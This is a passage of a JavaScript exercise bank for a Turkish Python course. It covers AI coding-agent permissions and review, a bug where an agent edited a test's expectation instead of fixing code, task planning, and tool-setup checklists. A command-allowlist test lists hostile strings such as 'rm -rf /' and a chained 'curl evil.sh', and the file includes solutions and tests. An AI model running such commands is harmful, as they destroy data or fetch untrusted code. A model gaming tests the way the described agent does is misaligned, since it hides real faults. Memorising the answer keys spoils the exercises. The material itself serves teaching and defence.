        tests: 'IZ = {"pytest", "ruff", "git diff", "git status"}\nON = {"git commit", "uv add", "git push"}\nassert komut_karari("pytest -q tests/", IZ, ON) == "izin"\nassert komut_karari("git diff --stat", IZ, ON) == "izin"\nassert komut_karari("git commit -m \'sepet düzeltmesi\'", IZ, ON) == "onay"\nassert komut_karari("git push --force origin main", IZ, ON) == "red", "force push her zaman red"\nassert komut_karari("rm -rf /", IZ, ON) == "red"\nassert komut_karari("pytest && curl evil.sh", IZ, ON) == "onay", "Zincirleme komut insan onayı ister"\nassert komut_karari("python kur.py", IZ, ON) == "red"\nassert komut_karari("echo \'kapanmamış", IZ, ON) == "red"\n',
        hints: ['Zincirleme kontrolünü ayrıştırmadan önce ham metinde yap.', '"git diff" ve "pytest" gibi hem iki hem tek parçalı anahtarları desteklemek için {" ".join(p[:2]), p[0]} kümesiyle kesişime bak.'],
        why: 'Ajan izinleri "izin listesi" (allowlist) mantığıyla çalışmalı: bilinmeyen komut varsayılan olarak reddedilir. Zincirleme komutlar izinli bir komutun arkasına tehlikeli bir komut saklayabildiği için ayrıca denetlenir.' },
      { t: 'code',
        id: 'yapay-zeka-ile-kod-w5',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. Ajan, başarısız testi "düzeltmek" için şu değişikliği yaptı ve "tüm testler geçiyor" dedi. <code>indirimli_tutar(tutar, oran)</code> tutara <code>oran</code> (0–1 arası) kadar indirim uygulayıp 2 basamağa yuvarlanmış sonucu döndürmeli; oran aralık dışıysa <code>ValueError</code>. Ajan testteki beklenen değeri koda uydurmuş ve fonksiyondaki asıl hatayı bırakmış. Fonksiyonu düzelt (testler ilk, doğru hâliyle çalıştırılacak).</p>',
        start: 'def indirimli_tutar(tutar, oran):\n    if oran > 1:\n        raise ValueError("oran 0-1 arası olmalı")\n    return round(tutar * oran, 2)\n\n# Ajanın "düzelttiği" test:\n# assert indirimli_tutar(200, 0.25) == 50.0   (önceden: == 150.0)\n',
        sol: 'def indirimli_tutar(tutar, oran):\n    if not 0 <= oran <= 1:\n        raise ValueError("oran 0-1 arası olmalı")\n    return round(tutar * (1 - oran), 2)\n',
        tests: 'assert indirimli_tutar(200, 0.25) == 150.0, "%25 indirimle 200 TL → 150 TL (testin ilk hâli doğruydu)"\nassert indirimli_tutar(320, 0) == 320.0\nassert indirimli_tutar(99.99, 0.1) == 89.99\nfor kotu in (-0.1, 1.5):\n    try:\n        indirimli_tutar(100, kotu); assert False, f"oran={kotu} reddedilmeli"\n    except ValueError:\n        pass\n',
        hints: ['İndirimli tutar = tutar × (1 − oran).', 'Negatif oran da geçersizdir: 0 <= oran <= 1.'],
        why: 'Bu, ajan PR\'larında en sık görülen tuzaktır: kodu değil testi değiştirmek. İncelemede test dosyasındaki beklenen değer değişikliklerine özellikle bak ve "neden değişti?" diye sor.' },
      { t: 'code',
        id: 'yapay-zeka-ile-kod-w6',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Görev planını doğrula ve sırala. <code>plan_sirala(gorevler)</code>: <code>gorevler</code> <code>{ad: {"bagimli": [..], "dosyalar": [..]}}</code> sözlüğü. Dönüş: <b>dalga</b> listesi; her dalga aynı anda (paralel ajanlarla) yapılabilecek görev adlarının alfabetik listesi. Bir görev, tüm bağımlılıkları önceki dalgalarda bittiyse o dalgaya girer. Ek kural: aynı dalgadaki iki görev <b>ortak dosyaya</b> dokunuyorsa çakışır; alfabetik olarak sonra gelen görev bir sonraki dalgaya ertelenir. Bilinmeyen bağımlılıkta <code>KeyError</code>, döngüde <code>ValueError("döngü")</code> fırlat.</p>',
        start: 'def plan_sirala(gorevler):\n    pass\n',
        sol: 'def plan_sirala(gorevler):\n    for ad, g in gorevler.items():\n        for b in g["bagimli"]:\n            if b not in gorevler:\n                raise KeyError(b)\n    biten, dalgalar = set(), []\n    kalan = set(gorevler)\n    while kalan:\n        hazir = sorted(a for a in kalan if all(b in biten for b in gorevler[a]["bagimli"]))\n        if not hazir:\n            raise ValueError("döngü")\n        dalga, kullanilan = [], set()\n        for a in hazir:\n            dosyalar = set(gorevler[a]["dosyalar"])\n            if dosyalar & kullanilan:\n                continue\n            dalga.append(a)\n            kullanilan |= dosyalar\n        dalgalar.append(dalga)\n        biten |= set(dalga)\n        kalan -= set(dalga)\n    return dalgalar\n',
        tests: 'G = {\n    "testler": {"bagimli": [], "dosyalar": ["tests/test_csv.py"]},\n    "tip_ipuclari": {"bagimli": [], "dosyalar": ["servis/csv.py"]},\n    "ayristirici": {"bagimli": ["testler"], "dosyalar": ["servis/csv.py", "servis/ayristir.py"]},\n    "belgeler": {"bagimli": [], "dosyalar": ["README.md"]},\n    "hata_raporu": {"bagimli": ["ayristirici"], "dosyalar": ["servis/ayristir.py"]},\n}\nassert plan_sirala(G) == [["belgeler", "testler", "tip_ipuclari"], ["ayristirici"], ["hata_raporu"]], f"Gelen {plan_sirala(G)}"\nC = {"a": {"bagimli": [], "dosyalar": ["x.py"]}, "b": {"bagimli": [], "dosyalar": ["x.py"]}}\nassert plan_sirala(C) == [["a"], ["b"]], "Aynı dosyaya dokunanlar aynı dalgada olmamalı"\ntry:\n    plan_sirala({"a": {"bagimli": ["b"], "dosyalar": []}, "b": {"bagimli": ["a"], "dosyalar": []}}); assert False\nexcept ValueError as h:\n    assert str(h) == "döngü"\ntry:\n    plan_sirala({"a": {"bagimli": ["yok"], "dosyalar": []}}); assert False\nexcept KeyError:\n    pass\nassert plan_sirala({}) == []\n',
        hints: ['Her turda bağımlılıkları bitmiş görevleri alfabetik sırayla topla; hiç yoksa döngü vardır.', 'Dalgaya alırken o dalgada kullanılan dosyaları bir kümede tut; kesişen görevi bu tura alma.', 'Ertelenen görev bir sonraki turda zaten yeniden hazır olur.'],
        why: 'Paralel ajan çalıştırmak (ayrı git worktree\'lerinde) hız kazandırır ama aynı dosyaya dokunan iki ajan birleştirme çatışması üretir. Bağımlılık grafiği ve dosya çakışması kontrolü, görevi bölerken yapılacak planlamanın ta kendisidir.' }
    ],
    faq: [
      { q: 'Ajan kullanırken kodu anlamadan ilerlemek kötü mü?',
        a: 'Evet; incelemediğin kodun sorumluluğunu üstlenemezsin. Ajanı hızlı taslak çıkaran bir ekip arkadaşı gibi düşün: PR\'ını okursun, test kanıtını görürsün, anlamadığın satırı ona açıklatırsın. Öğrenme aşamasındaysan önce kendin dene, sonra ajanın çözümüyle karşılaştır.' },
      { q: 'Kurallar dosyasını kim yazar ve ne sıklıkla güncellenir?',
        a: 'Ekip birlikte yazar ve depoya commit edilir; kişisel tercihler ayrı, kullanıcıya özel dosyada tutulur. Ajan aynı hatayı iki kez yaptığında (yanlış test komutu, yasak klasöre dokunma) ilgili kuralı ekle; artık geçerli olmayan kuralları sil. Kısa tutmak, dosyanın okunmasını garanti etmekten daha önemlidir.' }
    ],
    mistakes: [
      { bad: '# Ajan testi düzeltti:\nassert indirimli_tutar(200, 0.25) == 50.0',
        good: '# Önce testin neden değiştiğini sor; kodu düzelt:\nassert indirimli_tutar(200, 0.25) == 150.0',
        why: 'Testi koda uydurmak hatayı gizler; PR incelemesinde test beklentisi değişikliklerini ayrıca sorgula.' }
    ] }
);
})(window);
/* Kesit Python — kurulum ve araç dersleri için konuya uygun alıştırmalar: teşhis, adım sırası, kendi bilgisayarında kontrol listesi */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
const M = (id, q, o, a, why) => ({ t: 'mc', stage: 'Teşhis', id, q: '<p>' + q + '</p>', o, a, why });
const O = (id, q, lines, why) => ({ t: 'order', plain: true, stage: 'Adım sırası', id, q: '<p>' + q + '</p>', lines, why });
const K = (id, q, steps, extra) => Object.assign({ t: 'local', stage: 'Kendi bilgisayarında', id, q: '<p>' + q + '</p>', steps }, extra || {});
X.push(
{ id: 'flask', ex: [ K('flask-yerel', 'Gerçek bir Flask uygulamasını bilgisayarında çalıştır. Tek dosya yeter.', ['Sanal ortamda <code>python -m pip install flask</code> yaz.', 'Aşağıdaki kodu <code>app.py</code> olarak kaydet.', '<code>flask --app app run</code> ile başlat.', 'İkinci terminalde komutu çalıştır ya da tarayıcıda adresi aç.'], { file: 'from flask import Flask, jsonify\n\napp = Flask(__name__)\n\n@app.get("/siparis/<int:no>")\ndef siparis(no):\n    return jsonify(no=no, durum="hazırlanıyor")\n', fname: 'app.py', cmd: 'curl http://127.0.0.1:5000/siparis/7', expect: '{"durum":"haz\\u0131rlan\\u0131yor","no":7}' }) ] },
{ id: 'fastapi', ex: [ K('fastapi-yerel', 'Gerçek bir FastAPI servisini bilgisayarında çalıştır.', ['<code>python -m pip install fastapi uvicorn</code> yaz.', 'Kodu <code>main.py</code> olarak kaydet.', '<code>uvicorn main:app --reload</code> ile başlat.', 'Komutu çalıştır; <code>http://127.0.0.1:8000/docs</code> adresinde otomatik belgeyi gör.'], { file: 'from fastapi import FastAPI\nfrom pydantic import BaseModel\n\napp = FastAPI()\n\nclass Siparis(BaseModel):\n    adet: int\n    fiyat: float\n\n@app.post("/toplam")\ndef toplam(s: Siparis):\n    return {"toplam": s.adet * s.fiyat}\n', fname: 'main.py', cmd: 'curl -X POST http://127.0.0.1:8000/toplam -H "Content-Type: application/json" -d "{\\"adet\\": 3, \\"fiyat\\": 2.5}"', expect: '{"toplam":7.5}' }) ] },
{ id: 'django-giris', ex: [ K('django-yerel-1', 'Gerçek bir Django projesi kur ve ilk sayfanı aç.', ['<code>python -m pip install django</code> yaz.', '<code>django-admin startproject site_proje .</code> çalıştır.', '<code>site_proje/urls.py</code> dosyasını aşağıdakiyle değiştir.', '<code>python manage.py migrate</code>, sonra <code>python manage.py runserver</code>.', 'Komutla sayfayı iste.'], { file: 'from django.contrib import admin\nfrom django.http import HttpResponse\nfrom django.urls import path\n\ndef merhaba(request):\n    return HttpResponse("Merhaba Django")\n\nurlpatterns = [\n    path("admin/", admin.site.urls),\n    path("", merhaba),\n]\n', fname: 'site_proje/urls.py', cmd: 'curl http://127.0.0.1:8000/', expect: 'Merhaba Django' }) ] },
{ id: 'django-ileri', ex: [ K('django-yerel-2', 'Önceki adımdaki projede Django test aracını çalıştır.', ['<code>python manage.py startapp katalog</code> yaz.', '<code>site_proje/settings.py</code> içinde <code>INSTALLED_APPS</code> listesine <code>"katalog"</code> ekle.', 'Aşağıdaki kodu <code>katalog/tests.py</code> olarak kaydet.', 'Testi çalıştır.'], { file: 'from django.test import TestCase\n\nclass AnaSayfa(TestCase):\n    def test_merhaba(self):\n        yanit = self.client.get("/")\n        self.assertEqual(yanit.status_code, 200)\n        self.assertContains(yanit, "Merhaba Django")\n', fname: 'katalog/tests.py', cmd: 'python manage.py test', expect: 'Ran 1 test in 0.0XXs\n\nOK' }) ] },
{ id: 'docker-deploy', ex: [ K('docker-yerel', 'Tek dosyalık bir Python betiğini konteynerde çalıştır. Docker Desktop ya da Docker Engine kurulu olmalı.', ['Klasörde <code>app.py</code> oluştur: <code>print("konteynerden merhaba")</code>.', 'Aşağıdaki içeriği <code>Dockerfile</code> olarak kaydet.', 'Komutları çalıştır.'], { file: 'FROM python:3.14-slim\nCOPY app.py /app.py\nCMD ["python", "/app.py"]\n', fname: 'Dockerfile', cmd: 'docker build -t merhaba .\ndocker run --rm merhaba', expect: 'konteynerden merhaba', why: 'Derslerdeki <code>python:3.12-slim</code> örnekleri sabit sürümü gösterir; projende kullandığın sürümü yaz.' }) ] },
{ id: 'spark-dagitik', ex: [ K('spark-yerel', 'PySpark\'ı tek makinede dene. Java 17 ya da üstü kurulu olmalı.', ['<code>python -m pip install pyspark</code> yaz.', 'Kodu <code>spark_deneme.py</code> olarak kaydet.', 'Çalıştır. İlk satırlarda günlük mesajları görürsün; sonuç tablosu sonda gelir.'], { file: 'from pyspark.sql import SparkSession\n\nspark = SparkSession.builder.master("local[2]").appName("deneme").getOrCreate()\ndf = spark.createDataFrame([("İzmir", 10), ("Ankara", 5), ("İzmir", 7)], ["sehir", "adet"])\ndf.groupBy("sehir").sum("adet").orderBy("sehir").show()\nspark.stop()\n', fname: 'spark_deneme.py', cmd: 'python spark_deneme.py', expect: '+------+---------+\n| sehir|sum(adet)|\n+------+---------+\n|Ankara|        5|\n| İzmir|       17|\n+------+---------+' }) ] },
{ id: 'redis-kuyruk', ex: [ K('redis-yerel', 'Gerçek Redis ile önbellek dene. Redis sunucusu gerekir; en kolayı Docker.', ['<code>docker run --rm -p 6379:6379 redis</code> ile sunucuyu başlat.', 'Başka terminalde <code>python -m pip install redis</code> yaz.', 'Kodu kaydet ve çalıştır.'], { file: 'import redis\n\nr = redis.Redis(decode_responses=True)\nr.set("urun:1", "Çay", ex=60)\nprint(r.get("urun:1"))\nprint(r.ttl("urun:1") > 0)\n', fname: 'onbellek.py', cmd: 'python onbellek.py', expect: 'Çay\nTrue' }) ] },
{ id: 'gui-tkinter', ex: [ K('tkinter-yerel', 'Gerçek bir pencere aç. Tarayıcıda çalışmaz; tkinter Python\'la birlikte gelir (Linux\'ta <code>python3-tk</code> paketi gerekebilir).', ['Kodu <code>pencere.py</code> olarak kaydet.', 'Çalıştır; pencere açılır.', 'Düğmeye bas: etiket değişmeli.'], { file: 'import tkinter as tk\n\npencere = tk.Tk()\npencere.title("Sayaç")\nsayi = tk.IntVar(value=0)\ntk.Label(pencere, textvariable=sayi).pack(padx=40, pady=10)\ntk.Button(pencere, text="Artır", command=lambda: sayi.set(sayi.get() + 1)).pack(pady=10)\npencere.mainloop()\n', fname: 'pencere.py', cmd: 'python pencere.py' }) ] },
{ id: 'orkestrasyon', ex: [ K('orkestrasyon-yerel', 'Airflow kurmadan önce zamanlamanın temelini dene: bir betiği her dakika çalıştır.', ['Kodu <code>/tam/yol/is.py</code> olarak kaydet.', 'macOS/Linux: <code>crontab -e</code> ile aşağıdaki satırı ekle. Windows: Görev Zamanlayıcı\'da aynı işi tanımla.', 'İki dakika bekle, <code>is.log</code> dosyasına bak.', 'Bittiğinde satırı sil.'], { file: 'from datetime import datetime\n\nwith open("/tam/yol/is.log", "a", encoding="utf-8") as f:\n    f.write(datetime.now().isoformat(timespec="seconds") + " çalıştı\\n")\n', fname: 'is.py', cmd: '* * * * * /usr/bin/python3 /tam/yol/is.py', expect: '2026-11-02T10:15:00 çalıştı\n2026-11-02T10:16:00 çalıştı' }) ] },
{ id: 'kurulum-araclar', ex: [
  M('kurulum-araclar-1', 'Yeni başlıyorsun ve Kasım 2026\'da bilgisayarına Python kuracaksın. En mantıklı seçim hangisi?', ['En yeni sürümün bir öncesi (3.14): tam destekte, paketlerin hazır derlemeleri de var', 'Destek süresi bitmiş eski bir sürüm', 'Henüz çıkmamış ön sürüm (3.16)', 'Tarayıcıdaki motorla aynı olsun diye mutlaka 3.12'], 0, 'Yeni çıkan sürümde bazı paketlerin hazır derlemesi gecikebilir. Tarayıcı motorunun 3.12 olması bilgisayarındaki seçimi bağlamaz; temel dil aynıdır.'),
  M('kurulum-araclar-2', '<code>python --version</code> 3.14 diyor ama <code>pip install requests</code> sonrası <code>import requests</code> hata veriyor. İlk bakacağın şey?', ['pip başka bir Python\'a kuruyor olabilir: <code>python -m pip install requests</code> ile dene', 'Bilgisayarı yeniden başlat', 'requests paketi Python 3\'te yoktur', 'Dosyayı .txt olarak kaydet'], 0, '<code>python -m pip</code> paketi tam olarak o Python\'a kurar.'),
  O('kurulum-araclar-3', 'Sıfırdan bir projeye başlarken adımları sırala.', ['Python\'ı kur ve python --version ile doğrula', 'Proje klasörünü aç', 'python -m venv .venv ile sanal ortam kur', 'Sanal ortamı etkinleştir', 'python -m pip install ile paketleri kur', 'Kodu yaz ve çalıştır'], 'Sanal ortam paket kurmadan önce etkin olmalı; yoksa paketler genel Python\'a gider.'),
  M('kurulum-araclar-x3', 'Tarayıcıda çalışan kod bilgisayarında neden farklı davranabilir?', ['Thread, süreç ve ağ burada kısıtlı; paket sürümleri de farklı olabilir', 'Tarayıcıda farklı bir dil çalışır', 'Python her bilgisayarda farklı sonuç üretir', 'Fark olmaz, her şey birebir aynıdır'], 0, 'Temel dil aynıdır; farklar çalışma ortamından gelir.'),
  K('kurulum-araclar-x4', 'Kurulum kontrol listesi: bilgisayarında tek tek dene.', ['Terminal aç ve <code>python --version</code> (macOS/Linux: <code>python3 --version</code>) yaz.', '<code>python -m pip --version</code> yaz.', 'Masaüstünde <code>merhaba.py</code> oluştur, aşağıdaki kodu yaz.', '<code>python merhaba.py</code> ile çalıştır.'], { file: 'import sys\nprint("Merhaba, Python", sys.version_info.major)\n', fname: 'merhaba.py', cmd: 'python merhaba.py', expect: 'Merhaba, Python 3' })
] },
{ id: 'kurulum-windows', ex: [
  M('kurulum-windows-1', 'PowerShell\'de <code>python</code> yazınca Microsoft Store açılıyor. Neden?', ['Windows\'un "uygulama yürütme takma adı" gerçek Python\'un önüne geçiyor', 'Python yalnız Store\'dan kurulabilir', 'İnternet bağlantın yok', 'PowerShell Python çalıştıramaz'], 0, 'Ayarlar → Uygulamalar → Uygulama yürütme takma adları bölümünden kapatılır ya da PATH düzeltilir.'),
  M('kurulum-windows-2', '<code>\'python\' is not recognized</code> hatası alıyorsun, kurulum bitmişti. En olası neden?', ['Python PATH\'te değil ya da terminal kurulumdan önce açıktı', 'Python 32 bit kurulmuş', 'Dosya adı yanlış', 'pip eski'], 0, 'Terminali kapatıp aç; sürmezse <code>py</code> dene ya da PATH\'i düzelt.'),
  M('kurulum-windows-3', 'python.org Windows için bugün hangisini öne çıkarıyor?', ['Python install manager (yükleme yöneticisi); klasik yükleyici de sunuluyor', 'Yalnız Microsoft Store', 'Yalnız kaynak koddan derleme', 'Windows desteği kalktı'], 0, 'Yönetici birden çok sürümü kurup seçmeyi kolaylaştırır; klasik yükleyiciyle de çalışırsın.'),
  O('kurulum-windows-4', 'Windows\'ta sanal ortam kurma adımlarını sırala.', ['py -3.14 -m venv .venv', '.venv\\Scripts\\Activate.ps1', 'python -m pip install pandas', 'python rapor.py', 'deactivate'], 'Önce ortam, sonra etkinleştir, sonra kur ve çalıştır. İş bitince deactivate.'),
  M('kurulum-windows-5', 'Türkçe karakterli CSV\'yi <code>open(yol)</code> ile okurken <code>UnicodeDecodeError</code> alıyorsun (Python 3.14). Doğru düzeltme?', ['<code>open(yol, encoding="utf-8")</code> yaz', 'Dosya adını İngilizce yap', 'Python\'ı yeniden kur', 'errors="ignore" ekleyip harfleri kaybet'], 0, 'Windows\'ta 3.14 ve öncesinde varsayılan kodlama sistem kod sayfasıdır; 3.15 ile UTF-8 oldu. Kodlamayı her zaman açıkça yaz.'),
  K('kurulum-windows-6', 'Windows kontrol listesi.', ['python.org/downloads sayfasından install manager\'ı ya da klasik yükleyiciyi al.', 'PowerShell\'i yeniden aç, <code>python --version</code> ve <code>py --list</code> yaz.', 'Bir klasörde <code>py -m venv .venv</code>, ardından <code>.venv\\Scripts\\Activate.ps1</code> çalıştır.', 'Betik çalıştırma engeli çıkarsa <code>Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</code> yaz.', '<code>where python</code> çıktısının ilk satırı .venv içini göstermeli.'], { cmd: 'where python', expect: 'C:\\...\\proje\\.venv\\Scripts\\python.exe\nC:\\...\\Python314\\python.exe' })
] },
{ id: 'kurulum-macos-linux', ex: [
  M('kurulum-macos-linux-1', 'macOS\'ta <code>python</code> "command not found" diyor, <code>python3</code> çalışıyor. Ne yapmalısın?', ['<code>python3</code> kullan; sanal ortam etkinken <code>python</code> da çalışır', 'Sistem dosyalarını sil', 'Linux kur', 'Python 2 kur'], 0, 'macOS ve çoğu Linux\'ta komut adı python3\'tür.'),
  M('kurulum-macos-linux-2', 'Sistem Python\'una <code>sudo pip install</code> ile paket kurmak neden kötü fikir?', ['İşletim sisteminin kullandığı paketleri bozabilir; sanal ortam kullan', 'pip sudo ile çalışmaz', 'Paketler daha yavaş iner', 'Lisansa aykırıdır'], 0, 'Yeni Linux sürümleri bu yüzden externally-managed-environment hatası verir.'),
  O('kurulum-macos-linux-3', 'macOS\'ta Homebrew ile proje başlatma adımlarını sırala.', ['brew install python@3.14', 'python3.14 --version', 'python3.14 -m venv .venv', 'source .venv/bin/activate', 'python -m pip install requests'], 'Önce kur ve doğrula, sonra sanal ortam; etkinleştirince python doğru yeri gösterir.'),
  M('kurulum-macos-linux-4', '<code>which python</code> <code>/usr/bin/python3</code> gösteriyor, sanal ortam etkinleştirdiğini sanıyorsun. Sorun ne?', ['Ortam etkin değil; etkin olsaydı .venv/bin/python görünürdü', 'Sanal ortam bozuk olamaz, her şey doğru', 'which yanlış çalışır', 'Python silinmiş'], 0, '<code>source .venv/bin/activate</code> çalıştır ve yeniden bak.'),
  K('kurulum-macos-linux-5', 'macOS / Linux kontrol listesi.', ['<code>python3 --version</code> yaz; yoksa Homebrew (<code>brew install python@3.14</code>) ya da paket yöneticisiyle kur.', 'Bir klasörde <code>python3 -m venv .venv</code> çalıştır.', '<code>source .venv/bin/activate</code> yaz; satır başında (.venv) görünür.', '<code>which python</code> çıktısı .venv içini göstermeli.'], { cmd: 'which python', expect: '/home/sen/proje/.venv/bin/python' })
] },
{ id: 'vscode', ex: [
  M('vscode-1', 'VS Code altta yanlış Python\'u gösteriyor, <code>import pandas</code> sarı çiziliyor. Çözüm?', ['Komut paletinde "Python: Select Interpreter" ile .venv\'i seç', 'pandas\'ı silip yeniden yaz', 'VS Code\'u kaldır', 'Dosyayı başka klasöre taşı'], 0, 'Editör hangi yorumlayıcıyı kullandığını bilmelidir.'),
  M('vscode-2', 'Hata ayıklayıcıda bir satırın solunu tıkladın. Ne oldu?', ['Kesme noktası (breakpoint) koydun: kod orada durur, değişkenlere bakarsın', 'Satırı sildin', 'Satır yorum oldu', 'Dosya kaydedildi'], 0, 'F5 ile başlat, F10 ile adım adım ilerle.'),
  O('vscode-3', 'Yeni projede VS Code hazırlığını sırala.', ['Klasörü VS Code ile aç', 'Python eklentisini kur', 'Terminalde .venv oluştur', 'Python: Select Interpreter ile .venv\'i seç', 'Kaydederken biçimlendirme için Ruff ya da Black ayarla'], 'Yorumlayıcı seçimi ortam kurulduktan sonra yapılır.'),
  M('vscode-4', 'Proje ayarlarını ekip arkadaşlarınla paylaşmak istiyorsun. Nereye yazarsın?', ['Proje klasöründeki <code>.vscode/settings.json</code>', 'Kullanıcı ayarlarına', '<code>.env</code> dosyasına', '<code>requirements.txt</code>\'e'], 0, 'Proje ayarı kullanıcı ayarını geçersiz kılar ve depoyla paylaşılır.'),
  K('vscode-5', 'VS Code kontrol listesi.', ['VS Code ve Python eklentisini kur.', 'Bir klasör aç, <code>rapor.py</code> oluştur, <code>print("ok")</code> yaz.', 'Sağ alttan .venv yorumlayıcısını seç.', 'Üç satırlı kodda bir kesme noktası koy, F5 ile dur, değişkene bak.'])
] },
{ id: 'jupyter-colab', ex: [
  M('jupyter-colab-1', 'Hücreleri rastgele sırada çalıştırdın, sonuç tutmuyor. Kesin çözüm?', ['"Restart and run all" ile baştan sırayla çalıştır', 'Hücreleri silip unut', 'Bilgisayarı kapat', 'Sayaçları elle düzelt'], 0, 'Defter sırası değil çalışma sırası geçerlidir; temiz çalışma bunu doğrular.'),
  M('jupyter-colab-2', 'Colab\'de dün yüklediğin dosya bugün yok. Neden?', ['Oturum geçicidir; dosyaları Drive\'a kaydet ya da yeniden yükle', 'Dosya bozuldu', 'Google hesabın kapandı', 'pandas siler'], 0, 'Colab çalışma ortamı oturum bitince sıfırlanır.'),
  O('jupyter-colab-3', 'Temiz bir analiz defteri akışını sırala.', ['Sanal ortamda jupyter kur', 'Defteri aç, ilk hücreye import\'ları yaz', 'Veriyi oku ve incele', 'Analizi hücrelere böl', 'Restart and run all ile doğrula', 'HTML olarak dışa aktar'], 'Paylaşmadan önce temiz çalıştırma şart.'),
  M('jupyter-colab-4', 'Defterdeki <code>!pip install x</code> neden bazen başka ortama kurar?', ['! kabukta çalışır, çekirdeğin Python\'u olmayabilir; <code>%pip install x</code> kullan', 'pip defterde çalışmaz', 'x paketi yoktur', 'Hücre uzun'], 0, '%pip çekirdeğin ortamına kurar.'),
  M('jupyter-colab-5', 'conda ne zaman işine yarar?', ['C kütüphanesi ağırlıklı bilimsel paketleri ve Python sürümünü birlikte yönetmek istediğinde', 'Her projede pip yerine zorunlu', 'Yalnız Windows\'ta', 'Python yazmak için'], 0, 'Çoğu proje için venv ve pip yeter; ağır bağımlılıklarda conda kolaylık sağlar.'),
  K('jupyter-colab-6', 'Bilgisayarında dene.', ['Sanal ortamda <code>python -m pip install notebook</code> yaz.', '<code>jupyter notebook</code> ile aç, yeni defter oluştur.', 'Bir hücreye <code>2 + 2</code> yaz, Shift+Enter ile çalıştır.', 'İstersen aynı şeyi colab.research.google.com üzerinde dene.'], { expect: '4' })
] },
{ id: 'terminal-temelleri', ex: [
  O('terminal-temelleri-1', 'Terminalde bir betiği çalıştırma adımlarını sırala.', ['pwd ile bulunduğun klasöre bak', 'cd proje ile klasöre gir', 'ls ile dosyaları gör', 'python rapor.py ile çalıştır', 'echo $? ile çıkış kodunu gör'], 'Windows PowerShell\'de ls çalışır; çıkış kodu için $LASTEXITCODE.'),
  M('terminal-temelleri-2', '<code>python rapor.py</code> "No such file" diyor. İlk bakacağın şey?', ['Doğru klasörde misin: <code>pwd</code> ve <code>ls</code>', 'Python\'u yeniden kur', 'Dosyayı sil', 'İnternet bağlantısı'], 0, 'Komut göreli yol arar; çoğu zaman yanlış klasördesindir.'),
  M('terminal-temelleri-3', '<code>python rapor.py &gt; cikti.txt</code> ne yapar?', ['Çıktıyı ekrana değil dosyaya yazar, varsa üzerine yazar', 'Dosyadan girdi okur', 'Çıktıyı dosyaya ekler', 'Betiği siler'], 0, '&gt;&gt; ise sona ekler.'),
  M('terminal-temelleri-4', '<code>cat log.txt | grep HATA</code> ne yapar?', ['log.txt içindeki HATA geçen satırları süzer', 'HATA adlı dosya açar', 'log.txt\'yi siler', 'Python\'u çalıştırır'], 0, 'Boru (|) soldaki çıktıyı sağdakine girdi yapar.'),
  M('terminal-temelleri-5', 'Boşluk içeren dosya adını nasıl verirsin?', ['Tırnakla: <code>python "yeni rapor.py"</code>', 'Boşluğu silmeden olduğu gibi yaz', 'Parantezle', 'Olmaz'], 0, 'Kabuk boşlukta argümanı böler; tırnak bir arada tutar.'),
  K('terminal-temelleri-6', 'Bilgisayarında dene.', ['Terminal aç, <code>mkdir deneme</code> ve <code>cd deneme</code> yaz.', 'Aşağıdaki dosyayı <code>arg.py</code> olarak kaydet.', 'Komutla çalıştır, çıktıyı karşılaştır.', '<code>python arg.py İzmir 7 &gt; c.txt</code> yaz, dosyaya bak.'], { file: 'import sys\nprint(sys.argv[1:])\n', fname: 'arg.py', cmd: 'python arg.py İzmir 7', expect: "['İzmir', '7']" })
] },
{ id: 'git-proje-yapisi', ex: [
  O('git-proje-yapisi-1', 'Bir özelliği ana dala göndermeden önceki akışı sırala.', ['git switch -c ozellik', 'Kodu yaz ve testleri çalıştır', 'git add .', 'git commit -m "Özelliği ekle"', 'git push -u origin ozellik', 'Pull request aç ve incelet'], 'Dal, ana kodu korur; inceleme birleştirmeden önce olur.'),
  M('git-proje-yapisi-2', '<code>git status</code> <code>.venv/</code> binlerce dosya gösteriyor. Ne yapmalısın?', ['<code>.gitignore</code>\'a <code>.venv/</code> ekle', 'Hepsini commit et', 'Sanal ortamı sil ve bir daha kurma', 'Depoyu sil'], 0, 'Üretilen dosyalar depoya girmez; bağımlılıklar requirements ya da pyproject ile kayıtlıdır.'),
  M('git-proje-yapisi-3', '<code>git pull</code> sonrası "CONFLICT" gördün. Doğru adım?', ['Çakışan dosyayı aç, işaretleri çöz, <code>git add</code> ve <code>git commit</code>', 'Klasörü silip yeniden klonla', '<code>git push --force</code>', 'Hata yok say'], 0, 'Çakışma Git\'in sana sorduğu sorudur: hangi satır kalacak?'),
  M('git-proje-yapisi-4', 'İyi commit mesajı hangisi?', ['"Sipariş toplamında KDV hatasını düzelt"', '"düzeltme"', '"asdf"', '"son hali final2"'], 0, 'Ne yaptığını söyleyen kısa bir cümle.'),
  O('git-proje-yapisi-5', 'Küçük bir Python projesinin ilk commit\'ine kadar adımları sırala.', ['Klasörü aç ve git init yaz', '.gitignore oluştur (.venv, __pycache__)', 'README.md ve kodu ekle', 'git add .', 'git commit -m "İlk sürüm"'], 'Önce .gitignore: istemediğin dosya hiç girmesin.'),
  K('git-proje-yapisi-6', 'Bilgisayarında dene: ilk deponu kur.', ['<code>git --version</code> ile Git\'in kurulu olduğunu doğrula.', 'Yeni klasörde aşağıdaki komutları çalıştır.', 'Bir satır değiştir, <code>git diff</code> ile farkı gör, yeniden commit et.', 'İstersen GitHub\'da boş depo aç, <code>git remote add origin ...</code> ve <code>git push -u origin main</code>.'], { cmd: 'git init\necho "print(\'merhaba\')" > app.py\necho ".venv/" > .gitignore\ngit add .\ngit commit -m "İlk sürüm"\ngit log --oneline', expect: 'a1b2c3d İlk sürüm  (kimlik sende farklı olur)' })
] }
);
})(window);
/* Kesit Python — 'docker-deploy' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'docker-deploy',
    min: 30,
    html: `<p>İmajın hazır ve compose ile yerelde çalışıyor. Şimdi üç gerçek soru var: uygulamanın önüne ne koyarsın (Nginx), en hızlı nasıl yayına alırsın (PaaS) ve ekip büyüdüğünde konteynerleri kim yönetir (Kubernetes)?</p>
<h2>Nginx: ters vekil sunucu (reverse proxy)</h2>
